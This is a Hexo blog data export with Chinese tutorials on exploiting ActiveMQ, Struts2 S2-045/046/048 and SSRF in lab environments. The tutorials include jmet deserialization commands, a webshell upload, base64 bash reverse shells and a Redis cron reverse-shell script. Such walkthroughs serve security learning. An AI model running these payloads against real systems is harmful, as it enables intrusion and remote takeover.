{"meta":{"title":"Dim","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"ActiveMQ漏洞","slug":"activemq-vulnerability-basis","date":"2019-03-29T03:07:55.000Z","updated":"2019-03-29T07:48:23.102Z","comments":true,"path":"Foundation/activemq-vulnerability-basis/","link":"","permalink":"http://yoursite.com/Foundation/activemq-vulnerability-basis/","excerpt":"","text":"0x01、目的ActiveMQ漏洞完整版，主要讲下面三种较为常见的漏洞： 1.ActiveMQ未授权/默认帐号密码登录 2.ActiveMQ反序列化漏洞(CVE-2015-5254) 3.ActiveMQ fileserver远程代码执行漏洞(CVE-2016-3088) 0x02、简述ActiveMQ是Apache软件基金会下的一个开源消息驱动中间件软件，Apache旗下的一个JMS（Java Message Service，Java消息队列）。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。 1.ActiveMQ未授权/默认帐号密码登录Activemq的默认开启端口是8161和61616（均可修改），其中8161是后台管理页面，61616是给Java用的TCP端口。可以直接尝试登录后台管理页面。默认账号密码为：admin/admin 2.ActiveMQ反序列化漏洞(CVE-2015-5254)影响版本：Apache ActiveMQ 5.0.0 - 5.12.1漏洞简析：该漏洞要想利用有一个前提条件，需要拿到后台权限，也就是在1的基础上进行。（注：当然也可以构造链接发给管理员诱使管理点击触发，非本文重点）该漏洞是由于程序没有现在可在代理中序列化的类，远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。 先来简单解释一下JAVA的序列化，如下图1所示：图1 JAVA序列化序列化就是将对象的状态信息转换为可以存储或传输的形式的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。JAVA提供了一个序列化的API接口： 1）可序列化的类需要实现java.io.Serializable接口 2）java.io.ObjectOutputStream.writeObject() 该方法用来写序列化的对象 3）java.io.ObjectInputStream.readObject()，read就是用来读序列化的对象 4）中间使用二进制协议来存储对象的状态 针对反序列化漏洞：如果从网络、文件、数据库等读取了不可信的数据，同时作为read方法的输入值，这个时候就会触发反序列化漏洞。至于为什么要序列化，哪些需要序列化等等问题，详情请见随后的反序列化漏洞章节。CVE-2015-5254漏洞利用过程： 1）构造（可以使用ysoserial）可执行命令的序列化对象 2）作为一个消息，发送给目标61616端口 3）访问web管理页面，读取消息，点击event列表中的事件链接，触发漏洞 使用工具：jmet（内置ysoserial，无须另外下载），该工具原理是使用ysoserial生成Payload并发送，可以选择ysoserial下gadget中的ROME或者最常见的CommonsCollections1都可以。具体攻击过程，详见下一部分。 3.ActiveMQ fileserver远程代码执行漏洞(CVE-2016-3088)影响版本：Apache ActiveMQ 5.0.0 - 5.13.x漏洞简析：ActiveMQ的fileserver允许用户通过PUT方法上传文件，将webshell利用代码上传至fileserver路径下，然后使用MOVE方法将webshell利用代码转移到可执行路径，获取webshell。（注：有看到一些文章说，利用OPTIONS先探测一下http允许的请求方法，看是否允许PUT和MOVE，实际测试时，发现只返回了PUT，但MOVE虽然是允许的，但在返回头中并没有体现，见下图2）（漏洞点在fileserver处，所以OPTIONS的时候，后边注意跟具体目录，否则返回信息失败）图2 OPTIONS查看允许的http请求此时，并不能看到PUT和MOVE，感觉比较鸡肋（其实可以直接尝试性攻击，走不走OPTIONS这一步都是一样的） 0x03、漏洞检测 ActiveMQ未授权/默认帐号密码登录检测访问后台管理页面即可，默认账号密码admin/admin。重点在2和3上 ActiveMQ反序列化漏洞(CVE-2015-5254)已拿到管理权限的情况下。下载jmet，构造payload，向队列发送反序列化数据到消息队列中。 wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar 下载jmet到攻击机上(注：首次使用的时候需要同目录下创建一个external文件夹，否则执行会出错） java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME [靶机IP] 61616 注：ROME也可以替换成CommonsCollections1，一样的效果。图3 发送反序列化数据注意，上图3中有个ID号，该ID就是访问Web页面需要触发的事件ID。访问http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event注：127.0.0.1：8161视具体情况进行替换。图4 查看event事件列表在图4中点击图3返回ID对应的事件号，进行漏洞触发。如下图5所示。图5 点击事件触发漏洞此时可以看到注入的命令是：touch /tmp/success，在/tmp/文档下边生成一个success文件。由于是自己搭的环境，这个时候可以进入环境中查看一下这个命令是否执行成功。如本环境利用的docker进行搭建。在activemq对应漏洞目录下依次执行 docker-compose exec activemq bash ls /tmp 查看文件，如下图6所示：图6 查看执行是否成功实际测试中，这个时候不能切入到对方系统中，所以将命令可以替换成反弹shell的命令。如下：bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1 （12345端口可任意进行替换，保证不冲突即可）再开启服务器监听：nc -lvvp 12345即可，如下图7所示：图7 成功反弹shell注：如果反弹不成功可能是JAVA Runtime.getRuntime().exec()中不能使用管道符，需要进行一次base64的编码。编码命令如下： bash -c {echo,payload的basse64编码}|{base64,-d}|{bash,-i} 将上面的payload进行编码后： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS41NS4zMi4zOS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i} 最后完整的执行编码后的payload，如下所示： java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS41NS4zMi4zOS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}&quot; -Yp ROME 127.0.0.1 61616 此时可以上传自己的ssh公钥或者其他方式，进入系统进行提权等操作，可参考文章：https://www.cnblogs.com/backlion/p/9970516.html ActiveMQ fileserver远程代码执行漏洞(CVE-2016-3088)攻击过程可分为三步： 1）对fileserver进行PUT操作，上传webshell脚本 2）获取绝对目录，为下一步做准备(两种) 3）进行MOVE操作，触发漏洞抓包后，对fileserver进行PUT操作，此处PUT了一个webshell的内容，注意此处put的是一个txt文本，有时候直接put一个jsp文件可能会上传失败，所以命名为txt，此处任意格式只要能上传成功其实关系都不大，因为随后要进行MOVE操作，MOVE的同时可以修改后缀名。图8 对fileserver进行put操作注：此时返回的是204，证明上传成功，如果上传失败会返回400等下一步爆目录，获取目录的方式有两种。 （1）访问web页面，直接获取访问URL：http://域名：端口/admin/test/systemProperties.jsp其中activemq.home下的就是需要获取到的目录。如下图9所示。 图9 获取目录方法1 （2）加入特殊字符，直接爆出来 如下图所示，PUT fileserver/test/%20%20，返回500 图10 获取目录方法2目录获取到后，就可以将上传的webshell脚本移动到可执行路径下admin利用MOVE方法，加入Destination，返回204移动成功，如下图11所示图11 移动成功此时可以直接访问webshell存放的目录，执行任意命令，根据本webshell访问URL如下，此处利用的cmd是ls：http://127.0.0.1:8161/admin/hello.jsp?cmd=ls图12 webshell命令执行 0x04、总结本文主要讲了ActiveMQ方面比较常见的漏洞，如ActiveMQ未授权或者默认账号密码弱口令登录，反序列化漏洞（CVE-2015-5254)，以及远程代码执行漏洞（CVE-2016-3088)。其中反序列化漏洞主要利用的jmet工具，用ysoserial生成可序列化的对象发送数据触发漏洞。远程代码执行则利用ActiveMQ下fileserver可进行PUT操作以及允许MOVE请求的特点，先对fileserver上传webshell，获取到目录后，再MOVE到可以执行jsp脚本的admin目录下触发漏洞。最后给出一张简易的图仅作记录参考：图13 ActiveMQ漏洞逻辑图 0x05、参考文献综述：https://blog.csdn.net/cjx529377/article/details/81612319https://www.freebuf.com/column/161188.htmlhttps://vulhub.org/#/environments/反序列化（CVE-2015-5254）：https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdfhttps://www.jianshu.com/p/7c70b19ee4dfhttps://www.cnblogs.com/backlion/p/9970516.html远程代码执行（CVE-2016-3088）：https://blog.csdn.net/xg_ren/article/details/80776474https://paper.seebug.org/346/","categories":[],"tags":[{"name":"activemq","slug":"activemq","permalink":"http://yoursite.com/tags/activemq/"},{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]},{"title":"Struts2-045、046、048漏洞基础","slug":"struts2-045-046-048-vulnerability-basis","date":"2019-03-22T09:22:06.000Z","updated":"2019-03-26T02:48:10.639Z","comments":true,"path":"Foundation/struts2-045-046-048-vulnerability-basis/","link":"","permalink":"http://yoursite.com/Foundation/struts2-045-046-048-vulnerability-basis/","excerpt":"","text":"Struts2-045、046、048漏洞基础 0x00、涉及漏洞Struts2-045（CVE-2017-5638），影响版本Struts2.3.5~Struts2.3.31,Struts2.5.0~Struts2.5.1Struts2-046（CVE-2017-5638），影响版本同上Struts2-048（CVE-2017-9791），影响版本Struts2.3.x系列启用了struts2-struts1-plugin插件的版本 0x01、目的主要为了测试一个Struts2漏洞集成扫描工具，初步测试过程中发现了一些问题。所以顺带了解一下。搭建的环境是struts2.3.24版本，另一个是利用docker以及vulhub现成的环境。测试内容包含45、46、48这3个漏洞。但是工具最开始只能测出45，46。 0x02、原理在进入正题之前，先来了解一下最基础的东西。一个http请求包含3个部分，分别是： （1）请求行 （2）请求报头 （3）消息主体 http协议规定post提交的数据必须放在消息主体中，但是协议对编码方式没有规定。服务器端就根据请求头中的Content-Type字段来判断请求中消息主体是以哪种方式进行编码的，然后再对消息主体进行解码。具体的编码方式如下： （1）application/x-www-form-urlencoded最常见post提交数据的方式，以form表单形式提交数据。 （2）application/json以json串提交数据。 （3）multipart/form-data一般使用来上传文件举个例子，如下图1所示，是一个文件上传的包结构。 图1 文件上传包结构除了上文所讲的Content-Type以外，同时还存在一个Content-Disposition。再来解释一下Content-Disposition：是MIME协议的扩展，当浏览器收到请求头时，会激活文件下载对话框，请求头中的文件名会自动填充到对应的文本框中。 S2-045原理：成因（文字描述）：由于上传功能的异常处理函数没有正确处理用户输入的错误信息，导致攻击者可通过发送恶意数据包，利用该漏洞可以在服务器上执行任意命令。简单分析：当Content-Type中出现”multipart/form-data“时，会被认为有文件上传，然后调用struts2默认的文件上传组件Jakarta，通过组件漏洞载入OGNL代码并执行，达到远程调用的目的。 S2-046原理：与45的触发点相同，在使用文件上传功能时调用Jakarta组件，通过在http报文头部的Content-Disposition中构造恶意的filename字段，可导致RCE。利用条件：满足两点。 （1）Content-Type中包含multipart/form-data （2）Content-Disposition中filename包含OGNL语句。利用方式：2种情况。 （1）Content-Disposition的filename存在空字节。 （2）Content-Disposition的filename不存在空字节。当filename不存在空字节想要成功利用的时候，需要满足以下两个条件： A.Content-Length的长度值需要超过Struts2允许上传的最大值（2M） B.数据流需要经过JakartaStreamMultipartRequest。（即在struts.xml中添加配置）对于B的条件，是非默认情况下的配置，所以如果在filename不存在空字节的时候，利用成功的概率会大大降低。 S2-048原理：问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用是为了让struts2兼容struts1，所以将struts1的action封装成struts2的action在struts2上来运行使用。包里调用了getText()函数，而该函数能执行OGNL表达式，且该参数的输入点可以被用户直接进行控制。从而可以实现RCE攻击。利用方式：name字段添加POC 0x03、漏洞判断这部分主要是讲关于如何识别一个网站是用的Struts框架或者说是用的web框架类型。判断Struts的方法：（2个方案，仅限于初步判断，误判较高，但快速） （1）通过网页后缀来判断，如do.action等，这也是最常用的方法之一，不准的原因是JBOSS系统也是以do为后缀，但JBoss和tomcat不是一回事。 （2）通过actis，该方法最早是由kxlzx在好些年前提出来，要求的是对应的Action需要继承自ActionSupport类。利用方法： 如原始URL为：http://www.baidu.com检测所用URL则为：http://www.baidu.com/?actis=1111如果返回的页面出现异常，则可以判定目标是基于Struts2构建的。异常包括以下几种： A）网站页面可能会直接出现 404 或者 500 等错误。 B）网站页面上输出了与业务有关错误消息，或者1111被回显到了网站前端的页面上。 C）网站页面的内容结构发生了明显的变化 D）网站页面发生了301重定向 以上是专门针对Struts2框架的。下面介绍一些通用的探测Web应用框架的方法。使用工具： （1）Wappalyzer （2）Whatweb （3）BlindElephant 判别依据： （1）HTTP头查看HTTP响应数据包头的X-Powered-By字段：X-Powered-By: Mono //web应用框架是Mono （2）Cookies更可靠的方法是查看HTTP请求包（注意是请求包），每个框架特有的Cookies，例如：Cookie: CAKEPHP=sidfiwhefjdcsfowjoef; //web应用框架是CakePHP上面的工具里第三个目前没有使用过，通过前两个已经达到目的，因此主要从前两个来说。利用Wappalyzer的时候，对自己搭的环境，以及搭在远程服务器上的Struts2环境进行探测，发现并没有显示出想要的Struts框架来，如下图2所示： 图2 wappalyzer探测再利用whatweb进行探测，得出poweredby内容，获取框架信息，如下图3所示。 图3 whatweb探测 0x04、漏洞检测网上扫描工具比较多，就不细讲，这部分主要是抓包手动加POC，后面顺便简述一下工具的修改以及工具还存在的问题（测试范围仅针对这三种类型漏洞）。先来看一下POC，POC结构上大体相同，具体的部分根据编号不同有差异。以网上最常见的来说。如下图4所示。 图4 POC分为三部分： （1）触发文件漏洞，声明为文件上传%{(#_=’multipart/form-data’)注：开头是“%”，根据Struts代码，也可以替换成“$”，同样有效 （2）注入OGNL代码，通过ognl表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性，并将获取的结果覆盖_memberAccess属性，绕过SecurityMemberAccess的限制。如下图5所示： 图5 注入ognl代码 （3）调用CMD命令，首先判断操作系统，win下调用cmd，linux下调用bash。至于执行的具体命令可自行进行修改。 图6 调用cmd命令先来看一下S2-045，注入点是在Content-Type中，抓包后进行修改。发现GET和POST请求都可以注入。如下图7和图8所示。图7中利用netstat命令，打印出端口开放情况。图8利用了whoami打印出本机名。 图7 端口开放情况 图8 post请求打印本机名测试S2-046的点主要在于利用filename，但是抓包改包的时候发现并不能正确回显（如下图9所示），在修改jakarta配置后，依旧不能正常回显，但用集成工具进行测试时，发现可以正常显示。注：S2-045以及S2-046都是上传位置，抓包在fileupload处（如下图10所示）。 图9 S2-046抓包改包无法正常回显 图10 S2-045及S2-046抓包点 测试S2-048的点在name字段，在进行本机测试的时候，利用网上公开最多的一个POC，是不能正常回显的，进行URL编码后依旧无效。但在远程搭建的服务器上可以响应该POC（如下图11所示，显示netstat命令不存在，这里集成工具测试时也有些问题）。本机搭的环境是048肯定存在的环境，但利用POC并不能测出48的漏洞，所以在对代码进行了多次测试后，利用了另一个POC如下图12所示。（奇怪的是，该POC测试远程服务器时，无回显） 图11 远程服务器响应S2=048常见POC 图12 非常用S2-048POC 图13 非常用POC测试本机S2-048结果注：S2-048的抓包位置在：intergration下的Struts 1 integration处，如下图14所示。 图14 S2-048抓包位置至此就是S2-045，S2-046，S2-048的手工抓包以及测试点。下面就来看一下集成工具方面存在的问题以及简单的修改。利用的工具是github上的一个集成工具：struts-scan，扫描范围较广，从S-05到S-057一些危害比较大的漏洞都有所涉及。但在测试本机的时候不能发现S2-048的漏洞（如下图15所示）。 图15 集成工具测试本机环境漏测S2-048所以看一下该工具具体代码实现细节。 图16 S2-048集成工具代码实现细节 图17 判别回显依据该代码实现逻辑比较简单（如上图16所示），就是在name字段加载POC，其中postdata处该字典各字段对应的正是在intergration/editGangster.action页面提交post请求时各框内需要填入的值，然后根据接收到的数据包的一些特征进行判断，这里判断是根据POC中命令来的，此处用到的命令是netstat -an，如上图17所示，是该POC的判别依据。可以看到该工具集成的POC就是网上最常用的那一个，经过上面的抓包测试，发现本机测试时该POC确实有问题，由于测试远程服务器上专门搭的S2-048采用另一个POC时也出现了问题，所以此处，需要对该代码进行修改的就是，同时利用两个POC进行测试，使之兼容。所以此处增添了一个部分S2-048-02，同时，为了方便测试，在回显的时候除了显示漏洞是否存在以外，针对漏洞存在的情况直接打印出命令执行后的结果。如下图18所示。 图18 修改集成工具后漏洞测试结果修改之后可以成功兼容。但根据该集成工具的实现逻辑以及实际过程中碰到的问题来看，该工具还需要进一步的修改。主要修改点在以下方面： （1）在S2-048测试中，可以看到vulnurl中在通过urlparse函数获取IP地址再结合添加的后缀是固定的值（固定值为struts2-showcase/integration/saveGangster.action），如下图19所示。 图19 S2-048测试URL问题就在于struts2-showcase实际上就是struts的war包解析后自动生成的文件夹，虽然默认情况下都为struts2-showcase，但实际开发中，只要有一点安全意识即可进行文件夹名字的修改。比如此处，将此war包改名为struts2，如下图20所示。 图20 struts的war包重命名此时测试，虽然输入的测试地址为struts2，但实际集成工具在进行发包时依旧会对struts2-showcase进行发包，如下图21所示。 图21 更改war包名字进行重测，测试结果失败此处其实应该结合目录字典爆破，可手工进行RCE攻击。 （2）判断回显依据上出现问题。判断仅根据执行netstat -an命令后回显的数据包中几种状态包括”Active Internet connections”，”Active Connections”，”活动连接”，”LISTEN”这四种进行漏洞判别，正常情况下netstat在linux和windows确实同时可使用，但不排除有些服务器所用的linux系统为最原生的系统，可能会出现该命令不存在的情况，只能执行ls等最基础的命令，如在上文中图11所示对远程服务器上的S2-048漏洞进行测试时出现的结果。该情况下漏洞并非不存在而是命令不存在，修改命令后，漏洞触发情况如下图22所示，对此执行whoami命令。 图22 远程S2-048漏洞执行whoami命令集成工具暂时修改内容只兼容了另外的测S2-048POC，之后有时间会进行其他方面的修改。 0x05、总结本文是针对Struts全家桶系列的基础内容之一，该文仅讲了Struts2-045，Struts2-046，Struts2-048三个漏洞，45和46的触发点都是在上传点位置，即fileupload处，而48的位置则是在integration处，45的漏洞，需要在Content-Type处执行文件上传功能，即multipart/form-data同时后面紧跟OGNL执行语句，而46的漏洞则除满足Content-Type：multipart/form-data同时在Content-Disposition下的filename处进行修改，这里边又包含两种情况，为含空字节和不含空字节。48的触发点则是在name字段，可利用的POC视具体情况。随后记叙了如何探测网站框架，插件或者whatweb等方式，然后对漏洞进行抓包测试，最后再针对集成工具进行一些测试修改以及针对代码逻辑结构提出了一些现目前存在的问题。最后，文末将给出一张简易的梳理图，如下图23所示。 图23 S-045，S2-046，S2-048逻辑梳理 0x06、参考文献https://blog.csdn.net/wutianxu123/article/details/82634738https://www.sohu.com/a/156177758_128736https://www.anquanke.com/post/id/85776http://blog.nsfocus.net/apache-struts2-vulnerability-analysis-protection-program/https://www.360zhijia.com/360anquanke/186708.htmlhttps://www.freebuf.com/vuls/129871.htmlhttp://netsecurity.51cto.com/art/201707/544837.htm（注：含漏洞搭建）https://www.freebuf.com/vuls/140410.htmlhttps://www.jianshu.com/p/356291fb26a2（S2-048另一POC）","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"Struts2","slug":"Struts2","permalink":"http://yoursite.com/tags/Struts2/"}]},{"title":"SSRF漏洞基础（一）","slug":"ssrf-vulnerability-basis1","date":"2019-02-21T06:49:32.000Z","updated":"2019-03-26T02:48:23.672Z","comments":true,"path":"Foundation/ssrf-vulnerability-basis1/","link":"","permalink":"http://yoursite.com/Foundation/ssrf-vulnerability-basis1/","excerpt":"","text":"0x01、漏洞描述SSRF是一种常见的Web漏洞，通常存在于需要请求外部内容的逻辑，当攻击者传入一个未经验证的URL，后端代码直接请求该URL，会造成SSRF漏洞。是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF的攻击目标是外网无法访问的内部系统，一大利用是探测内网端口开放信息，对于内网不是Web服务的，一般是返回端口对应服务的banner信息。Weblogic SSRF漏洞出现在UDDI组件（若安装Weblogic时没有选择UDDI组件则不会有该漏洞），更准确地说是UDDI包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。例如：一个正常的请求为：www.xxx.com/a.php?image=http://www.abc.com/1.jpg若将image后的网址换成与该服务器相连的内网服务器地址，若服务器端没有对获取的参数做出严格过滤及限制，则导致可以从外部服务器获取到内部服务器一定量的数据。注：IPv4协议下的内网IP段是预留出来的。10.0.0.0-10.255.255.255；172.16.0.0-172.31.255.255；192.168.0.0-192.168.255.255 0x02、漏洞检测SSRF漏洞常出现于： (1)通过URL地址来分享网页内容； (2)图片加载与下载； (3)URL关键字如：share,url,target,disploy,link,wap,link,sre,operator,imageurl等 检测方法通常通过排除法。 (1)若有图片等，通过新打开窗口上显示的URL判断，若地址栏是http://xxx.xxx.png,则无。 (2)抓包看是否有关键字如”url=http”(如下图1所示)，再进行后续判断，（如：SSRF是服务器端发起的，若加载一个图片，在本地浏览器中还存在对图片的请求，则无）在包里修改url的信息构造不同的请求，然后观察返回的状态码来探测信息。 图1 关键字“url”上图1对127.0.0.1的80端口返回了200。再次构造请求，使HTTP请求404，如下图2所示，返回状态码500，以及构造一个端口不开放的请求，使TCP连接被拒绝。同时也返回了500，如下图3所示。说明url参数后，该服务器确实进行了请求，可以初步判断该服务器存在SSRF漏洞。图2 请求不存在的页面返回500图3 请求未开放的端口返回500关于SSRF比较清晰的挖掘思路如下图所示：图4 SSRF挖掘如果网站进行了过滤，可以尝试进行绕过，常用且简单的绕过方式 (1)可以通过添加指向任意IP域名xip.io，如10.0.0.1.xip.io实际指向的是10.0.0.1。 (2)不知道内网IP段，常用127.0.0.1进行探测，如果网站对127.0.0.1进行了过滤，实际还可以用127.255.255.255尝试进行绕过。 (3)构造302跳转服务 Weblogic SSRF检测，根据状态来进行判断，请求开放的服务时，会得到一个response，具体的如下图5所示： 图5 SSRF服务探测（猪猪侠）上述四种状态均可以相互转化，如请求未开放——&gt;请求开放，可以通过更改请求的端口号来进行探测，从而回显不同的结果通过构造http://xxx.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://(内网IP)&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search对其进行探测，观察其回显状态，判断是否存在目标网段，Weblogic上的SSRF最主要的是operator参数，通过修改该参数探测内网地址和内网端口。漏洞页面显示如下图所示： 图6 Weblogic SSRF漏洞页面可以看到会有回显，常见的有5种状态，如下图所示： 图7 Weblogic SSRF回显状态并不是出现了图6的页面就表示存在该漏洞，需要根据回显状态进行判断，根据给出的POC内容判断，如下图所示。如果weblogic.uddi.client.structures.exception.XML_SoapException该段存在，且IOException on sendMessage该段不存在，则给出漏洞的提示。故状态4是不存在的，同时对状态4情况下更改内网段及端口号进行探测，发现回显状态没有变化。 图8 SSRF检测POC如果在不知道内网IP段的情况下，可以进行尝试访问Setup UDDI Explorer，如果开发者配置不当，该位置会直接给出内网地址的网段。如下图所示 图9 内网IP段探测0x03 漏洞利用该漏洞虽然在各大src上都被评为低位，但这是其本身危害有限，但该漏洞强大之处在于探测信息，从而方面下一步的利用，比如获取服务banner信息，探测内网telnet，ssh，redis等。探测到利用反弹shell，可以根据https://github.com/NoneNotNull/SSRFX最常见的一种是，探测6379端口开放Redis服务，利用Gopher协议攻击内网中的Redis，常见exp如下所示：redis-cli -h $1 flushallecho -e “nn/1 * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1nn”|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save 0x04 复现 Eg：利用环境里的远程文件包含漏洞包含一个执行端口扫描代码文件，再对内网端口开放情况进行探测。 图10 漏洞网址观察图10中的Get请求，发现一个参数language=lang_en.phpGet的请求：http://127.0.0.1/bWAPP_latest/bWAPP/rlfi.php?language=lang_en.php&amp;action=go利用language参数构造payload，远程文件包含并执行扫描脚本探测内网开放端口及服务先看一下扫描脚本部分代码段 图11 端口扫描代码段首先弹窗了一段字符串，测试一下文件包含后是否有执行，然后设置了一个参数ip，该参数即是构造Payload时，在POST DATA中的值，即外网主机不能探测到的内网IP地址构造Payload如下所示：POST：http://127.0.0.1/bWAPP/rlfi.php?language=http://xxx.xxx.xxx/evil/ssrf-1.txt&amp;action=goPOST DATA：ip=127.0.0.1由于该环境均搭载在本地上，所以IP地址均为127.0.0.1，实际操作中，每个IP地址代表的含义均不同。第一个http://127.0.0.1为正常的可以访问到的网址，language是参数，参数后边构造的http://xxx.xxx.xxx为扫描代码存放的地址，实际操作中，可以自己搭服务器，将扫描代码放置在自己的服务器上进行操作。POST DATA中的ip就是内网的ip地址，也就是扫描代码扫描的IP构造Payload后执行，执行结果如下图12，13所示： 图12 弹窗首先进行了一个弹窗，文件包含漏洞确实包含了该文件并执行。扫描的端口开放情况如下图所示： 图13 探测内网端口开放情况0x05 总结Weblogic的SSRF漏洞实际利用也大同小异，最常见的都是先进行内网端口方面的探测，再根据实际端口开放情况进行后续利用。SSRF本身并不会直接造成重大影响，但绕过了防火墙进入内网结合其他攻击方式，则可以对内网安全产生严重的威胁。此份报告仅对SSRF做了基础描述整理以及漏洞复现，SSRF漏洞实际操作中的利用也花样百出，可网上进行搜集多番探索。 0x05 参考文献浅谈CSRF漏洞：https://www.cnblogs.com/s0ky1xd/p/5859049.htmlhttp://zone.secevery.com/question/121https://www.t00ls.net/articles-41070.htmlhttps://www.jianshu.com/p/42a3bb2b2c2chttps://evilwing.me/2018/07/01/ssrf%E6%94%BB%E5%87%BB-%E8%AF%91%E6%96%87/https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html#http://blog.safebuff.com/2016/07/03/SSRF-Tips/http://www.mottoin.com/tech/115007.htmlhttps://www.freebuf.com/column/157466.htmlhttps://blog.csdn.net/chs007chs/article/details/52514888https://www.cnblogs.com/zuoxiaolongzzz/p/8906321.htmlhttps://www.cnblogs.com/ichunqiu/p/10286826.htmlhttps://github.com/NoneNotNull/SSRFX ——2019.2.20","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"SSRF","slug":"SSRF","permalink":"http://yoursite.com/tags/SSRF/"}]},{"title":"TEST,HEXO","slug":"TEST-HEXO","date":"2019-01-22T07:58:58.000Z","updated":"2019-01-22T08:07:29.875Z","comments":true,"path":"undefined/TEST-HEXO/","link":"","permalink":"http://yoursite.com/undefined/TEST-HEXO/","excerpt":"","text":"This is a test article.","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-01-22T06:43:00.231Z","updated":"2019-01-22T06:43:00.231Z","comments":true,"path":"undefined/hello-world/","link":"","permalink":"http://yoursite.com/undefined/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}